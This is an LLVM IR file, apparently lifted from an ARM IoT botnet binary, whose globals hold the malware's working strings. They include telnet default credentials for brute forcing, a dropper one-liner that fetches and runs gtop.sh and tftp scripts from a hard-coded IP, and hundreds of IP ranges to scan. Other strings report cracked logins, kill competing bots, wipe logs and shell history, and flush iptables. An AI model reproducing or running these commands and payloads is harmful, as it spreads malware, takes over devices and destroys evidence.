source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%sockaddr = type { i32, [14 x i8] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.3 = constant i32 -352321502
@global_var_28724.7 = global i32 0
@global_var_28734.8 = global i32* @global_var_28724.7
@global_var_28c2c.15 = global i32 0
@global_var_28728.18 = global i32 0
@global_var_130f0.22 = constant i32 -509558771
@global_var_28c5c.25 = global i32 0
@global_var_28c60.26 = local_unnamed_addr global i32 0
@global_var_28c64.27 = local_unnamed_addr global i32 0
@global_var_287dc.30 = local_unnamed_addr global i32 4095
@global_var_287d8.33 = global i32 362436
@global_var_1bfb0.35 = constant [7 x i8] c"(null)\00"
@global_var_2cc5c.37 = local_unnamed_addr global i32 0
@global_var_1bfb8.39 = constant [8 x i8] c"/bin/sh\00"
@global_var_1bfc0.41 = constant [3 x i8] c"sh\00"
@global_var_1bfc4.43 = constant [3 x i8] c"-c\00"
@global_var_1bfc8.46 = constant i32 -1
@global_var_1c3c8.48 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1c3d8.50 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_28c44.54 = global i32 0
@global_var_1c3e4.56 = constant [5 x i8] c"PING\00"
@global_var_1c3ec.58 = constant [14 x i8] c"gethostbyname\00"
@global_var_28c48.60 = global i32 0
@global_var_28c4c.61 = local_unnamed_addr global i32 0
@global_var_2eec8.63 = global i32 0
@global_var_1c3fc.65 = constant [6 x i8] c":>%$#\00"
@global_var_1c404.73 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_1c410.75 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_1c420.77 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_1c42c.79 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_1c43c.81 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_1c448.83 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_1c458.85 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_1c464.87 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_1c474.89 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_1c484.91 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_1c494.93 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_1c4a4.95 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_1c4b0.97 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_1c4c0.99 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_1c4d0.101 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_1c4e0.103 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_1c4f0.105 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_1c500.107 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_1c510.109 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_1c520.111 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_1c52c.113 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_1c538.115 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_1c548.117 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_1c554.119 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_1c560.121 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_1c56c.123 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_1c578.125 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_1c584.127 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_1c594.129 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_1c5a4.131 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_1c5b0.133 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_1c5c0.135 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_1c5cc.137 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_1c5d8.139 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_1c5e4.141 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_1c5f0.143 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_1c5fc.145 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_1c608.147 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_1c614.149 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_1c624.151 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_1c634.153 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_1c644.155 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_1c654.157 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_1c664.159 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_1c674.161 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_1c684.163 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_1c694.165 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_1c6a4.167 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_1c6b4.169 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_1c6c4.171 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_1c6d4.173 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_1c6e4.175 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_1c6f4.177 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_1c704.179 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_1c714.181 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_1c724.183 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_1c734.185 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_1c744.187 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_1c754.189 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_1c764.191 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_1c774.193 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_1c784.195 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_1c794.197 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_1c7a4.199 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_1c7b4.201 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_1c7c4.203 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_1c7d4.205 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_1c7e4.207 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_1c7f4.209 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_1c804.211 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_1c814.213 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_1c824.215 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_1c834.217 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_1c844.220 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_1c854.222 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_1c864.224 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_1c874.226 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_1c884.228 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_1c894.230 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_1c8a4.232 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_1c8b4.234 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_1c8c4.236 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_1c8d4.238 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_1c8e4.240 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_1c8f4.242 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_1c904.244 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_1c914.246 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_1c924.248 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_1c934.250 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_1c944.252 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_1c954.254 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_1c964.256 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_1c974.258 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_1c984.260 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_1c994.262 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_1c9a4.264 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_1c9b4.266 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_1c9c4.268 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_1c9d4.270 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_1c9e0.272 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_1c9f0.274 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_1ca00.276 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_1ca10.278 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_1ca1c.280 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_1ca2c.282 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_1ca3c.284 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_1ca4c.286 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_1ca5c.288 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_1ca6c.290 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_1ca7c.292 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_1ca8c.294 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_1ca9c.296 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_1caac.298 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_1cabc.300 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_1cacc.302 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_1cadc.304 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_1caec.306 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_1cafc.308 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_1cb0c.310 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_1cb18.312 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_1cb28.314 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_1cb38.316 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_1cb48.318 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_1cb58.320 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_1cb68.322 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_1cb78.324 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_1cb88.326 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_1cb98.328 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_1cba8.330 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_1cbb8.332 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_1cbc8.334 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_1cbd8.336 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_1cbe8.338 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_1cbf8.340 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_1cc08.342 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_1cc18.344 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_1cc28.346 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_1cc38.348 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_1cc48.350 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_1cc58.352 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_1cc68.354 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_1cc78.356 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_1cc88.358 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_1cc98.360 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_1cca8.362 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_1ccb8.365 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_1ccc8.367 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_1ccd8.369 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_1cce8.371 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_1ccf8.373 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_1cd08.375 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_1cd14.377 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_1cd24.379 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_1cd34.381 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_1cd44.383 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_1cd54.385 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_1cd64.388 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_1cd74.390 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_1cd84.392 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_1cd94.394 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_1cda4.396 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_1cdb4.398 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_1cdc4.400 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_1cdd4.402 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_1cde4.404 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_1cdf4.406 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_1ce04.408 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_1ce14.410 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_1ce24.412 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_1ce34.414 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_1ce44.416 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_1ce54.418 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_1ce64.421 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_1ce74.423 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_1ce84.425 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_1ce94.427 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_1cea4.429 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_1ceb4.431 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_1cec4.433 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_1ced4.435 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_1cee4.437 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_1cef4.439 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_1cf04.441 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_1cf14.443 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_1cf24.445 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_1cf34.447 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_1cf44.449 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_1cf54.451 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_1cf64.453 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_1cf74.455 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_1cf84.457 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_1cf94.459 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_1cfa4.461 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_1cfb4.463 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_1cfc4.465 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_1cfd4.467 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_1cfe4.469 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_287e0.473 = global i32 110
@global_var_1d004.476 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_2eebc.478 = global i32 0
@global_var_1bfa0.480 = constant [8 x i8] c"BusyBox\00"
@global_var_1bfa8.481 = constant i32 36
@global_var_1bfac.482 = constant i32 35
@global_var_28794.483 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bfa0.480, i32 0, i32 0), i8* bitcast (i32* @global_var_1bfa8.481 to i8*), i8* bitcast (i32* @global_var_1bfac.482 to i8*)]
@global_var_1bf68.485 = constant [7 x i8] c"nvalid\00"
@global_var_1bf70.486 = constant [6 x i8] c"ailed\00"
@global_var_1bf78.487 = constant [9 x i8] c"ncorrect\00"
@global_var_1bf84.488 = constant [6 x i8] c"enied\00"
@global_var_1bf8c.489 = constant [5 x i8] c"rror\00"
@global_var_1bf94.490 = constant [7 x i8] c"oodbye\00"
@global_var_1bf9c.491 = constant [4 x i8] c"bad\00"
@global_var_28774.492 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bf68.485, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bf70.486, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bf78.487, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bf84.488, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bf8c.489, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bf94.490, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bf9c.491, i32 0, i32 0)]
@global_var_28760 = external global i32
@global_var_1bdf8.499 = constant [7 x i8] c"telnet\00"
@global_var_1be00.500 = constant [5 x i8] c"root\00"
@global_var_1be08.501 = constant i32 0
@global_var_1be0c.502 = constant [318 x i8] c"cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A\00"
@global_var_28744.503 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bdf8.499, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1be00.500, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1be00.500, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bdf8.499, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1be00.500, i32 0, i32 0), i8* bitcast (i32* @global_var_1be08.501 to i8*), i8* getelementptr inbounds ([318 x i8], [318 x i8]* @global_var_1be0c.502, i32 0, i32 0)]
@global_var_1d010.505 = constant [3 x i8] c"\0D\0A\00"
@global_var_28750.507 = global [4 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bdf8.499, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1be00.500, i32 0, i32 0), i8* bitcast (i32* @global_var_1be08.501 to i8*), i8* getelementptr inbounds ([318 x i8], [318 x i8]* @global_var_1be0c.502, i32 0, i32 0)]
@global_var_287a4.509 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bf68.485, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bf70.486, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bf78.487, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bf84.488, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bf8c.489, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bf94.490, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bf9c.491, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bfa0.480, i32 0, i32 0), i8* bitcast (i32* @global_var_1bfa8.481 to i8*), i8* bitcast (i32* @global_var_1bfac.482 to i8*)]
@global_var_1d014.512 = constant i32 993024795
@global_var_1d080.514 = constant [16 x i8] c"REPORT %s:%s:%s\00"
@global_var_2875c.516 = local_unnamed_addr global [318 x i8]* @global_var_1be0c.502
@global_var_1d090.518 = constant [327 x i8] c"%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A x00\00"
@global_var_1d1d8.520 = constant [3 x i8] c"AA\00"
@global_var_1d1e0.522 = constant [320 x i8] c"cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A\00"
@global_var_1d4a8.524 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1d4b8.525 = constant [6 x i8] c"/tmp/\00"
@global_var_1d4c0.526 = constant [6 x i8] c"/var/\00"
@global_var_1d4c8.527 = constant [6 x i8] c"/dev/\00"
@global_var_1d4d0.528 = constant [10 x i8] c"/var/run/\00"
@global_var_1d4dc.529 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1d4e8.530 = constant [6 x i8] c"/mnt/\00"
@global_var_1d4f0.531 = constant [7 x i8] c"/boot/\00"
@global_var_1d4f8.532 = constant [6 x i8] c"/usr/\00"
@global_var_1d3e8.544 = constant [5 x i8] c"wget\00"
@global_var_1d3f0.545 = constant [6 x i8] c"armv*\00"
@global_var_1d384.546 = constant [5 x i8] c"bot*\00"
@global_var_1d3f8.547 = constant [6 x i8] c"ntpd*\00"
@global_var_1d398.548 = constant [7 x i8] c"hackz*\00"
@global_var_1d400.549 = constant [8 x i8] c"shitty*\00"
@global_var_1d408.550 = constant [6 x i8] c"jack*\00"
@global_var_1d35c.551 = constant [6 x i8] c"mips*\00"
@global_var_1d33c.552 = constant [5 x i8] c"sex*\00"
@global_var_1d410.553 = constant [4 x i8] c"i86\00"
@global_var_1d414.554 = constant [5 x i8] c"ssh*\00"
@global_var_1d37c.555 = constant [5 x i8] c"sh4*\00"
@global_var_1d38c.556 = constant [11 x i8] c"jackmeoff*\00"
@global_var_1d344.557 = constant [6 x i8] c"tftp*\00"
@global_var_1d41c.558 = constant [4 x i8] c"i56\00"
@global_var_1d420.559 = constant [5 x i8] c"mips\00"
@global_var_1d428.560 = constant [7 x i8] c"mipsel\00"
@global_var_1d430.561 = constant [4 x i8] c"sh4\00"
@global_var_1d434.562 = constant [4 x i8] c"x86\00"
@global_var_1d438.563 = constant [5 x i8] c"i686\00"
@global_var_1d440.564 = constant [4 x i8] c"ppc\00"
@global_var_1d444.565 = constant [5 x i8] c"i586\00"
@global_var_1d44c.566 = constant [23 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d3e8.544, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d3f0.545, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d384.546, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d3f8.547, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1d398.548, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1d400.549, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d408.550, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d35c.551, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d33c.552, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1d410.553, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d414.554, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d37c.555, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1d38c.556, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d344.557, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1d41c.558, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d420.559, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1d428.560, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1d430.561, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1d434.562, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d438.563, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1d440.564, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d444.565, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d444.565, i32 0, i32 0)]
@global_var_1d320.568 = constant [8 x i8] c"jackmy*\00"
@global_var_1d328.569 = constant [9 x i8] c"busybox*\00"
@global_var_1d334.570 = constant [5 x i8] c"bin*\00"
@global_var_1d34c.571 = constant [5 x i8] c"arm*\00"
@global_var_1d354.572 = constant [8 x i8] c"mipsel*\00"
@global_var_1d364.573 = constant [8 x i8] c"mips64*\00"
@global_var_1d36c.574 = constant [6 x i8] c"i686*\00"
@global_var_1d374.575 = constant [7 x i8] c"sparc*\00"
@global_var_1d3a0.576 = constant [6 x i8] c"bruv*\00"
@global_var_1d3d8.589 = constant [4 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1d384.546, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1d38c.556, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1d398.548, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d3a0.576, i32 0, i32 0)]
@global_var_1d528.594 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_1d5ac.598 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_fa3c.599 = constant i32 -442564508
@global_var_1d5bc.601 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_1d5e8.603 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_1d600.605 = constant [22 x i8] c"history -c;history -w\00"
@global_var_1d618.607 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_1d628.609 = constant [11 x i8] c"history -c\00"
@global_var_1d634.611 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_1d64c.613 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_1d660.615 = constant [11 x i8] c"history -w\00"
@global_var_1d66c.617 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_1d680.619 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_1d690.621 = constant [22 x i8] c"service iptables stop\00"
@global_var_1d6a8.623 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_1d6f4.625 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_1d734.626 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_1d774.627 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_1d804.628 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_1d83c.629 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
